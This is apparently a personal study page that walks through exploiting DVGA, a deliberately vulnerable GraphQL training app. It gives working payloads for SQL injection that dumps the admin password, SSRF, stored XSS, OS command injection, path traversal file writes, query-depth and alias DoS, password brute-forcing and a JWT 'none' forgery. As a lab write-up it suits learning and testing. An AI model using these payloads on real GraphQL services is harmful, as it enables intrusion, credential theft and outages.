@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../../img/favicon.ico" />
+    <title>Dvga - Internship Ramblings</title>
+    <link rel="stylesheet" href="../../../css/theme.css" />
+    <link rel="stylesheet" href="../../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Dvga";
+        var mkdocs_page_input_path = "ctfs/dvga/dvga.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <script src="../../../js/jquery-3.6.0.min.js" defer></script>
+    <!--[if lt IE 9]>
+      <script src="../../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+      <script>hljs.initHighlightingOnLoad();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../../.." class="icon icon-home"> Internship Ramblings
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../../..">Home</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">OWASP</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../OWASP/api/">Api</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">SAML</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../SAML/saml_notes/">SAML</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Audits</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../audits/PoC/">Coverflex</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../audits/neurowave/">NEUROWAVE, LDA</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Ctfs</span></p>
+              <ul class="current">
+                  <li class="toctree-l1"><a class="reference internal" href="#">Capital ctf</a>
+    <ul>
+                <li class="toctree-l2"><a class="reference internal" href="../../capital-ctf/">Index</a>
+                </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1 current"><a class="reference internal current" href="#">Dvga</a>
+    <ul class="current">
+                <li class="toctree-l2 current"><a class="reference internal current" href="./">Dvga</a>
+    <ul class="current">
+    <li class="toctree-l3"><a class="reference internal" href="#reconessaince">Reconessaince</a>
+        <ul>
+    <li class="toctree-l4"><a class="reference internal" href="#discovering-graphql-endpoint">Discovering graphql endpoint</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#graphql-type">GraphQL Type</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#googling">Googling</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#instrospection">Instrospection</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#flags">Flags</a>
+    </li>
+    </ul>
+                </li>
+    </ul>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Dvwss</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../dvwss/notes/">Notes</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Goatlin</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../goatlin/notes/">Goatlin Notes</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Notes</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../notes/api_types/">Api types</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../notes/http2/">Http2</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../notes/nosqli/">NoSQL</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../notes/sql/">SQL - Structured Query Language</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Portswigger</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../portswigger/labs/">PortSwigger labs</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Quiz</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../quiz/SecurityChampion/">QUIZ</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Research</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../research/angular_notes/">Angular</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../research/dangling%20markup/">Evading CSP with DOM-based dangling markup (PortSwigger) - An alternative approach</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="#">Subdomain takeover</a>
+    <ul>
+                <li class="toctree-l2"><a class="reference internal" href="../../../research/subdomain-takeover/">Index</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="#">Findings</a>
+    <ul>
+                <li class="toctree-l3"><a class="reference internal" href="../../../research/subdomain-takeover/findings/security-advisory/">Security Advisory</a>
+                </li>
+    </ul>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="#">Src</a>
+    <ul>
+                <li class="toctree-l3"><a class="reference internal" href="#">Commands</a>
+    <ul>
+                <li class="toctree-l4"><a class="reference internal" href="../../../research/subdomain-takeover/src/commands/commands/">Commands</a>
+                </li>
+    </ul>
+                </li>
+                <li class="toctree-l3"><a class="reference internal" href="#">Script</a>
+    <ul>
+                <li class="toctree-l4"><a class="reference internal" href="../../../research/subdomain-takeover/src/script/">Index</a>
+                </li>
+    </ul>
+                </li>
+    </ul>
+                </li>
+    </ul>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Techniques</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../techniques/interesting/">Techniques created by me (or not) uncommon in the wild</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../techniques/methodology/">A methodological checklist to logically deduce the steps needed to pentest a web app.</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../techniques/triggers/">Errors based/behaviour inferer</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Tools</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../tools/notes/">Notes</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../..">Internship Ramblings</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../../.." class="icon icon-home" alt="Docs"></a> &raquo;</li>
+          <li>Ctfs &raquo;</li>
+          <li>Dvga &raquo;</li>
+      <li>Dvga</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="dvga">DVGA</h1>
+<p><strong>It's a vulnerable graphql application mean't to train users in graphql hacking.</strong></p>
+<h2 id="reconessaince">Reconessaince</h2>
+<h3 id="discovering-graphql-endpoint">Discovering graphql endpoint</h3>
+<p>I started by using the application like a normal user, figuring out what it did but with BurpSuite open. After a few requests, I noticed it sent the information to an endpoint <code>graphql</code>. After sending a <code>GET</code> request, I noticed it expected a <code>query</code> parameter. This is it!</p>
+<h3 id="graphql-type">GraphQL Type</h3>
+<p>I used a fingerprinting tool which automatically does a number of things to detect that. It is <code>graphw00f</code>. After executing, it told me it was graphene.</p>
+<h3 id="googling">Googling</h3>
+<p>I googled for graphene's characteristics and it had a lot of security misconfigurations by default.</p>
+<pre><code>1. Field Suggestions: Enabled by Default
+
+2. Query Depth LImit: No Support
+
+3. Query Cost Analysis: No Support
+
+4. Introspection: Enabled by Default.
+
+</code></pre>
+<p>This basically means: </p>
+<ol>
+<li>
+<p>If we write a query with a field that doesn't exist but is keen to another one, it will suggest  that. (That allows us to bruteforce the schema). In my opinion this falls into <code>Security Misconfiguration</code> of the TOP 10 API.</p>
+</li>
+<li>
+<p>There is no depth limit, which means we can make the query be as big as we want. In my opinion this falls into <code>Lack of Resources and Rate-Limiting</code></p>
+</li>
+<li>
+<p>The server doesn't care about the cost the query has, that means it will execute it even if it will DoS the server. In my opinion, this falls into <code>Lack of Resources and Rate-Limiting</code></p>
+</li>
+<li>
+<p>The server can "look at itself" and figure its schema via client request. In my opinion, this falls into - <code>informative</code></p>
+</li>
+</ol>
+<h3 id="instrospection">Instrospection</h3>
+<pre><code>fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
+
+</code></pre>
+<h2 id="flags">Flags</h2>
+<p><strong>SQLi</strong>  </p>
+<p>SQL Injection happens when user input is directly joined with an SQL statement without proper validation. One simply needs to ascertain the context in which injection occurs and validate the resulting SQL statement.</p>
+<p>In this case, the web application, with the below payload, returns errors from which we can deduce user input is directly inputted in the SQL statement.</p>
+<p><code>query={pastes(filter:"1'"){content}}</code></p>
+<p>SInce this is an error based SQLi we have output, and that means we can directly exfiltrate the information by constructing an appropriate query.</p>
+<p>Steal admin username: <code>{pastes(filter:"a'%20UNION%20SELECT%201%2c%202%2c%20password%2c%204%2c%205%2c%206%2c%207%2c%208%20FROM%20users%20+WHERE+username+=+'admin'+--"){content}}</code></p>
+<p>This queries uses the UNION directive, which takes the results from two statements and places them on one virtual table. In this case, the first table, the one of the left, does not have an output, and the second query only has one. In order to find out which field is being reflected in the response, we can simply do <code>SELECT 1, 2, 3, 4, 5, 6, 7, 8</code> and see which number is reflected, then we need only to replace, in the constructed statement, the number, for the field we want to SELECT. In this case, we care about the password field, so all we need to do is replace it with corresponding number. </p>
+<p><strong>SSRF</strong> </p>
+<p>Server-Side Request Forgery - As the a name implies, a request is made server-side. In this case, it's not blind, as the html of the site requested is fully reflected onto the page. SSRF can be damaging. As it is server side, one can replace a simple <code>http://</code> request, with, for example, <code>file://</code>, then the server will interpret it as a directive to look into its own file system, and will then reflect the file you give it from there.</p>
+<pre><code>
+{&quot;query&quot;:&quot;mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\n        importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\n          result\n        }\n      }&quot;,&quot;variables&quot;:{&quot;host&quot;:&quot;eowhrtbaia65ev1.m.pipedream.net&quot;,&quot;port&quot;:443,&quot;path&quot;:&quot;/&quot;,&quot;scheme&quot;:&quot;https&quot;}}
+
+</code></pre>
+<p><strong>Stored XSS &amp; HTML Injection</strong> </p>
+<p>Stored XSS, or persistent XSS, means user input is reflected onto the html without proper validation and is stored in a databse, which means everytime you open the page, the payload will execute. Whether it be JS code or HTML code.</p>
+<p><code>{"query":"mutation{createPaste(title:\"swag'&lt;script&gt;alert(1);&lt;/script&gt;\",content:\"swag2'&lt;script&gt;alert(1);&lt;/script&gt;\"){paste{title,content}}}"}</code></p>
+<p><strong>OS Command Injection</strong> </p>
+<p>OS Command Injection - This implies the direct use of input to the shell or simply a <code>system</code> function with input made by the user. That sink, or direct communcation with the shell, allows us to inject arbitrary commands on any host for as long as the host has those commands available.</p>
+<p><code>query={systemDebug(arg:+";+sleep+10;")}</code></p>
+<pre><code>{&quot;query&quot;:&quot;mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\n        importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\n          result\n        }\n      }&quot;,&quot;variables&quot;:{&quot;host&quot;:&quot;localhost&quot;,&quot;port&quot;:80,&quot;path&quot;:&quot;/; uname -a;&quot;,&quot;scheme&quot;:&quot;http&quot;}} 
+
+</code></pre>
+<p><strong>Discovering GraphQL</strong> -</p>
+<p>Discovering graphql is as simple as trying out a few of the common endpoints, as that is usually where it is installed.</p>
+<p><code>GET /graphql</code></p>
+<p><strong>Resource Intensive Query Attack</strong> - <code>{pastes(limit:100000){title,public,owner{paste{title,public,owner{paste{title,public,owner{paste{title,public}}}}}}}}}</code></p>
+<p>This happens because of circular logic. One object leads to another and that same object leads to the first one. This can be used to skip authorization checks or DoS. If we construct a query with the needed ammount of depth, we can DoS. If we use the circular logic to access like this: <code>query={users(username:"yourusername"){posts(made_by:"notyourusername"){users{username}}}</code>, we can bypass authorization checks.</p>
+<p><strong>Batch Query Attack</strong> -
+ <code>mutation{login(username:"admin",password:"admin"){accessToken,refreshToken}second:login(username:+"admin",password:"123456"){accessToken,refreshToken}}</code> or
+<code>python CrackQL.py -t http://localhost:5013/graphql -q sample-queries/login.graphql -i sample-inputs/usernames_and_passwords.csv</code></p>
+<p>Batch queries - Means we can use a first query, then a second query, which means, multiple queries at the same time, can facilitate bruteforce.</p>
+<p><strong>Aliases based Attack</strong> -</p>
+<p>Aliases are means to call the same object in two different ways so that they don't conflict. For example:</p>
+<pre><code>{
+  empireHero: hero(episode: EMPIRE) {
+    name
+  }
+  jediHero: hero(episode: JEDI) {
+    name
+  }
+}
+</code></pre>
+<p>WIth result:</p>
+<pre><code>{
+  &quot;data&quot;: {
+    &quot;empireHero&quot;: {
+      &quot;name&quot;: &quot;Luke Skywalker&quot;
+    },
+    &quot;jediHero&quot;: {
+      &quot;name&quot;: &quot;R2-D2&quot;
+    }
+  }
+}
+
+</code></pre>
+<pre><code>query=query{q1:systemUpdate+q2:systemUpdate+q3:systemUpdate}
+
+</code></pre>
+<p>Means we can create aliases for Objects and as such can do multiple queries of the same type at the same time, If enough queries are made, this can lead to DoS.</p>
+<p><strong>GraphQL Query Deny List Bypass</strong> </p>
+<p>This can be done, if the check is done via operation name, by finding a way to rename the operation. Either via operation name or aliases, for example. This happens because the backend looks for a name which does not exist, as it was renamed by changing the operation name to an arbitrary value or creating an alias for that operation.</p>
+<pre><code>{
+&quot;query&quot;:&quot;{q1:systemHealth}&quot;
+}
+
+</code></pre>
+<p>or</p>
+<pre><code>{
+&quot;query&quot;:&quot;query getPastes{systemHealth}&quot;
+}
+
+</code></pre>
+<p><strong>Arbitrary File Write &amp; Path Traversal</strong></p>
+<p>This happens because there is a sink in the source code which opens a file, allows traversal and then writes to it.</p>
+<p>In this case particularly, I can bet its the <code>open</code> function of Python with the <code>w</code> flag. It takes direct user input onto it and as such we can traverse and write arbitrarily</p>
+<pre><code>mutation {
+  uploadPaste(filename:&quot;../../../../../tmp/file.txt&quot;, content:&quot;hi&quot;){
+    result
+  }
+}
+
+</code></pre>
+<p><strong>GraphQL weak password protection</strong> </p>
+<p>Basically, there is no rate limit checking in place, and as such an attacker can send as many requests as he wants. This means he will be able to crack a password.</p>
+<p>Here is an example script:</p>
+<pre><code># Brute Force attack with a list of passwords:
+passwordlist = ['admin123', 'pass123', 'adminadmin', '123']
+
+for password in passwordlist:
+  resp = requests.post('http://host/graphql',
+  json = {
+    &quot;query&quot;:&quot;query {\n  systemDiagnostics(username:\&quot;admin\&quot;, password:\&quot;{}\&quot;, cmd:\&quot;ls\&quot;)\n}&quot;.format(password),
+    &quot;variables&quot;:None
+  })
+
+  if not 'errors' in resp.text:
+    print('Password is', password
+
+</code></pre>
+<p>or you can use CrackQL:</p>
+<pre><code>query{systemDiagnostics(username: &quot;admin&quot;, password: {{password|str}}, cmd: &quot;sleep 10&quot;) {}}
+
+</code></pre>
+<p>Place this in a arbitrary named file with extension graphql: <code>mypayload.graphql</code>
+Pass it to CrackQL like:</p>
+<pre><code>python CrackQL.py -t http://localhost:5013/graphql -q mypayload.graphql -i sample-inputs/passwords.csv```
+
+</code></pre>
+<p><strong>GraphQL Interface</strong></p>
+<p>There's an interface that allows to query GraphQL in a friendly way. 
+Simply browse to <code>http://localhost:5013/graphiql</code>. If needed, set the <code>graphiql:disabled</code> cookie by switching disabled with enabled &lt;=&gt; <code>graphiql:enabled</code></p>
+<p><strong>JWT Token Forge</strong></p>
+<p>This works because we can change the signing key to <code>none</code> and the server accepts that. Basically, the logic goes like this:
+We change the algorithm to none =&gt; send it to the server =&gt; recognizes that type =&gt; lets it pass without verifiying the signature because it accepts jwt's without one.</p>
+<p>To reproduce this, login as operator:</p>
+<pre><code>{&quot;query&quot;:&quot;mutation{login(username:\&quot;operator\&quot;,password:\&quot;password123\&quot;){accessToken}}&quot;}
+
+</code></pre>
+<p>Copy the accessToken (save it somewhere if you want).</p>
+<p>Go to <code>token.dev</code></p>
+<p>Paste the token</p>
+<p>Change the algorithm to <code>none</code></p>
+<p>Change user to <code>admin</code></p>
+<p>Send a request like this but replace the token with yours (don't forget to include a <code>.</code> at the end of the token).</p>
+<pre><code>{&quot;query&quot;:&quot;{me(token:\&quot;&lt;your_token_here&gt;\&quot;){id,username,password}}&quot;}
+
+</code></pre>
+<p>Send the request, notice you are admin and you have the password.</p>
+<p><strong>Field Duplication Attack</strong></p>
+<p>This happens because there's no restraint to how many fields can be inside a query. This can stress the server, leading to a DoS</p>
+<pre><code>query {
+  pastes {
+    owner {
+      pastes {
+            ipAddr # 1
+            ipAddr # 2
+            ipAddr # 3
+            ipAddr # 4
+            ipAddr # 1000
+          }
+        }
+      }
+
+</code></pre>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../../capital-ctf/" class="btn btn-neutral float-left" title="Index"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../../../dvwss/notes/" class="btn btn-neutral float-right" title="Notes">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../../capital-ctf/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../../../dvwss/notes/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script>var base_url = '../../..';</script>
+    <script src="../../../js/theme_extra.js" defer></script>
+    <script src="../../../js/theme.js" defer></script>
+      <script src="../../../search/main.js" defer></script>
+    <script defer>
+        window.onload = function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        };
+    </script>
+
+</body>
+</html>
